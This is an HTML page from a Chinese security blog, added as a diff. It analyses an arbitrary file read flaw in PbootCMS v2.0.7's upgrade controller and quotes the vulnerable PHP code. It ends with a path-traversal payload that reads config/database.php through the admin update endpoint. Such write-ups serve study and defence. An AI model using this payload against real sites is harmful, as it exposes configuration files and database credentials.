@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PbootCMS v2.0.7 任意文件读取一、漏洞简介仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的&#x2F;script&#x2F;目录 二、漏洞影响PbootCMS v2.0.7 三、复现过程漏洞分析漏洞文件apps&#x2F;admin&#x2F;controller&#x2F;system&#x2F;UpgradeController.php &lt;?php     ...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/PbootCMS/PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="PbootCMS v2.0.7 任意文件读取一、漏洞简介仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的&#x2F;script&#x2F;目录 二、漏洞影响PbootCMS v2.0.7 三、复现过程漏洞分析漏洞文件apps&#x2F;admin&#x2F;controller&#x2F;system&#x2F;UpgradeController.php &lt;?php     ...">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:00.905Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-PbootCMS/PbootCMS v2.0.7 任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.905Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PbootCMS-v2-0-7-任意文件读取"><a href="#PbootCMS-v2-0-7-任意文件读取" class="headerlink" title="PbootCMS v2.0.7 任意文件读取"></a>PbootCMS v2.0.7 任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PbootCMS v2.0.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞文件<code>apps/admin/controller/system/UpgradeController.php</code></p>
+<pre><code>&lt;?php
+    ...
+    public function update()&#123;
+        if ($_POST) &#123;
+            if (! ! $list = post(&#39;list&#39;)) &#123;
+                $list = explode(&#39;,&#39;, $list);
+                $backdir = date(&#39;YmdHis&#39;);
+
+                // 分离文件
+                foreach ($list as $value) &#123;
+                    if (stripos($value, &#39;/script/&#39;) !== false) &#123;
+                        $sqls[] = $value;
+                    &#125; else &#123;
+                        $path = RUN_PATH . &#39;/upgrade&#39; . $value;
+                        $des_path = ROOT_PATH . $value;
+                        $back_path = DOC_PATH . STATIC_DIR . &#39;/backup/upgrade/&#39; . $backdir . $value;
+                        if (! check_dir(dirname($des_path), true)) &#123;
+                            json(0, &#39;目录写入权限不足，无法正常升级！&#39; . dirname($des_path));
+                        &#125;
+                        if (file_exists($des_path)) &#123; // 文件存在时执行备份
+                            check_dir(dirname($back_path), true);
+                            copy($des_path, $back_path);
+                        &#125;
+
+                        // 如果后台入口文件修改过名字，则自动适配
+                        if (stripos($path, &#39;admin.php&#39;) !== false &amp;&amp; stripos($_SERVER[&#39;SCRIPT_FILENAME&#39;], &#39;admin.php&#39;) === false) &#123;
+                            if (file_exists($_SERVER[&#39;SCRIPT_FILENAME&#39;])) &#123;
+                                $des_path = $_SERVER[&#39;SCRIPT_FILENAME&#39;];
+                            &#125;
+                        &#125;
+
+                        $files[] = array(
+                            &#39;sfile&#39; =&gt; $path,
+                            &#39;dfile&#39; =&gt; $des_path
+                        );
+                    &#125;
+                &#125;
+
+                // 更新数据库
+                if (isset($sqls)) &#123;
+                    $db = new DatabaseController();
+                    switch (get_db_type()) &#123;
+                        case &#39;sqlite&#39;:
+                            copy(DOC_PATH . $this-&gt;config(&#39;database.dbname&#39;), DOC_PATH . STATIC_DIR . &#39;/backup/sql/&#39; . date(&#39;YmdHis&#39;) . &#39;_&#39; . basename($this-&gt;config(&#39;database.dbname&#39;)));
+                            break;
+                        case &#39;mysql&#39;:
+                            $db-&gt;backupDB();
+                            break;
+                    &#125;
+                    sort($sqls); // 排序
+                    foreach ($sqls as $value) &#123;
+                        $path = RUN_PATH . &#39;/upgrade&#39; . $value;
+                        if (file_exists($path)) &#123;
+                            //echo $path;
+                            //exit;
+                            $sql = file_get_contents($path);
+                            if (! $this-&gt;upsql($sql)) &#123;
+                                $this-&gt;log(&quot;数据库 $value 更新失败!&quot;);
+                                json(0, &quot;数据库&quot; . basename($value) . &quot; 更新失败！&quot;);
+                            &#125;
+                        &#125; else &#123;
+                            json(0, &quot;数据库文件&quot; . basename($value) . &quot;不存在！&quot;);
+                        &#125;
+                    &#125;
+                &#125;
+
+                // 替换文件
+                if (isset($files)) &#123;
+                    foreach ($files as $value) &#123;
+                        if (! copy($value[&#39;sfile&#39;], $value[&#39;dfile&#39;])) &#123;
+                            $this-&gt;log(&quot;文件 &quot; . $value[&#39;dfile&#39;] . &quot; 更新失败!&quot;);
+                            json(0, &quot;文件 &quot; . basename($value[&#39;dfile&#39;]) . &quot; 更新失败，请重试!&quot;);
+                        &#125;
+                    &#125;
+                &#125;
+
+                // 清理缓存
+                path_delete(RUN_PATH . &#39;/upgrade&#39;, true);
+                path_delete(RUN_PATH . &#39;/cache&#39;);
+                path_delete(RUN_PATH . &#39;/complite&#39;);
+                path_delete(RUN_PATH . &#39;/config&#39;);
+
+                $this-&gt;log(&quot;系统更新成功!&quot;);
+                json(1, &#39;系统更新成功！&#39;);
+            &#125; else &#123;
+                json(0, &#39;请选择要更新的文件！&#39;);
+            &#125;
+        &#125;
+    &#125;
+    ...
+?&gt;
+</code></pre>
+<p>可以看到注释写着更新数据库的部分，将<code>$sqls</code>遍历出来后放进了<code>file_get_contents</code>函数，然后调用了一个<code>upsql()</code>方法。跟过去看一下。</p>
+<pre><code>&lt;?php
+    // 执行更新数据库
+    private function upsql($sql)&#123;
+        $sql = explode(&#39;;&#39;, $sql);
+        $model = new Model();
+        foreach ($sql as $value) &#123;
+            $value = trim($value);
+            if ($value) &#123;
+                $model-&gt;amd($value);
+            &#125;
+        &#125;
+        return true;
+    &#125;
+?&gt;
+</code></pre>
+<p>将传过来的字符串用<code>;</code>分隔后又调用了一个<code>Model::amd()</code>方法。继续跟下去。</p>
+<p>文件<code>core/database/Sqlite.php</code></p>
+<pre><code>&lt;?php
+    ...
+    // 数据增、删、改模型，接受完整SQL语句，返回影响的行数的int数据
+    public function amd($sql)&#123;
+        $result = $this-&gt;query($sql, &#39;master&#39;);
+        if ($result) &#123;
+            return $result;
+        &#125; else &#123;
+            return 0;
+        &#125;
+    &#125;
+    // 执行SQL语句,接受完整SQL语句，返回结果集对象
+    public function query($sql, $type = &#39;master&#39;)&#123;
+        ...
+        switch ($type) &#123;
+            case &#39;master&#39;:
+                if (! $this-&gt;begin) &#123; // 存在写入时自动开启显式事务，提高写入性能
+                    $this-&gt;master-&gt;exec(&#39;begin;&#39;);
+                    $this-&gt;begin = true;
+                &#125;
+                $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, &#39;master&#39;);
+                break;
+            case &#39;slave&#39;:
+                $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, &#39;slave&#39;);
+                break;
+        &#125;
+        return $result;
+    &#125;
+    // 显示执行错误
+    protected function error($sql, $conn)&#123;
+        $err = &#39;错误：&#39; . $this-&gt;$conn-&gt;lastErrorMsg() . &#39;，&#39;;
+        if ($this-&gt;begin) &#123; // 存在显式开启事务时进行回滚
+            $this-&gt;master-&gt;exec(&#39;rollback;&#39;);
+            $this-&gt;begin = false;
+        &#125;
+        error(&#39;执行SQL发生错误！&#39; . $err . &#39;语句：&#39; . $sql);
+    &#125;
+    ...
+?&gt;
+</code></pre>
+<p>这里的<code>amd()</code>方法又调用了一个<code>query()</code>方法，在<code>query()</code>方法里可以看到直接将<code>$sql</code>放进SQL执行函数里，如果执行失败，直接将<code>$sql</code>打印出来。</p>
+<p>这样看下来这里的漏洞可以拿来执行任意SQL语句，但是由于这里用的是<code>sqlite</code>数据库，且当前已经在后台里了，所以这里的任意SQL执行也没啥可以利用的。<strong>（可能可以审一下用数据库里的数据当做输入的点，没准能利用起来）</strong></p>
+<p>但是由于正常的文件内容读出来直接当做SQL语句执行肯定会报错，所以这里可以用来读取文件。</p>
+<p>经过回溯可以发现<code>$sqls</code>，使用的POST传输过来的数据，且数据中需要有<code>/script/</code>字符串。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><pre><code>URL: http://www.0-sec.org/admin.php?p=/Upgrade/update
+POST: list=/script/../../../config/database.php
+</code></pre>
+<p>即可读取到文件**（仅限在Windows下，Linux不支持在不存在的文件夹下上跳，Linux下利用的话得找到一个系统或者程序自带的/script/目录）**</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7628">https://xz.aliyun.com/t/7628</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/PbootCMS/PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2qti800d6y8v18oe1gkq2" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20v2.0.7%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/PbootCMS/PbootCMS%20sql%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
